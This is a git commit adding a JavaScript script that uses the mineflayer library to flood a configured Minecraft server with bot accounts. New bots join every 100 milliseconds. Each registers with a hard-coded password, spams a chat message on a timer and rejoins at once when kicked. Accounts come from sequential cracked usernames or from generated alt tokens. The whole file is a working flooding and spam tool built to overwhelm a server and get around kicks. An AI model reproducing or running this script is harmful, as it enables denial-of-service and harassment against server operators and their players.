6c463aa480547cea5d96643ede5b9d11466791f5
43a1723 <hai1723notgay@gmail.com>
2024-07-29 11:31:52 +0700

    Create main.js

---
+++ scr/join/main.js
@@ -0,0 +1,75 @@
+const snekfetch = require("snekfetch");
+const config = require("./config.json");
+let number = 1;
+
+function createBot(username) {
+    var mineflayer = require('mineflayer');
+    var bot = mineflayer.createBot({
+        host: config.ip,
+        port: config.port,
+        username: username,
+        version: config.version,
+        plugins: {
+            conversions: false,
+            furnace: false,
+            math: false,
+            painting: false,
+            scoreboard: false,
+            villager: false,
+            bed: false,
+            book: false,
+            boss_bar: false,
+            chest: false,
+            command_block: false,
+            craft: false,
+            digging: false,
+            dispenser: false,
+            enchantment_table: false,
+            experience: false,
+            rain: false,
+            ray_trace: false,
+            sound: false,
+            tablist: false,
+            time: false,
+            title: false,
+            physics: config.physics,
+            blocks: true
+        }
+    });
+    bot.on('login', () => {
+        bot.chat("/login p@ssword123");
+        bot.chat("/register p@ssword123 p@ssword123");
+        setInterval(() => {
+            bot.chat(config.spammessage);
+        }, config.spamintervalms);
+        console.log("Logged in " + bot.username);
+    });
+    bot.on('error', err => console.log(err));
+    bot.on('kicked', function(reason) {
+        console.log("I got kicked for", reason, "lol");
+        createBot(username); // Retry with the same username
+    });
+}
+
+setInterval(() => {
+    if (config.altening) {
+        snekfetch.get(`http://api.thealtening.com/v1/generate?token=${config.altening_token}&info=true`).then(n => {
+            createBot(n.body.token);
+        });
+    } else {
+        number++;
+        createBot(config.crackedusernameprefix + number.toString());
+    }
+}, 100);  // Reduce delay between logins to 100ms
+
+// Create and login multiple bots at once
+for (let i = 0; i < 5; i++) {  // Create 5 bots immediately
+    if (config.altening) {
+        snekfetch.get(`http://api.thealtening.com/v1/generate?token=${config.altening_token}&info=true`).then(n => {
+            createBot(n.body.token);
+        });
+    } else {
+        number++;
+        createBot(config.crackedusernameprefix + number.toString());
+    }
+}
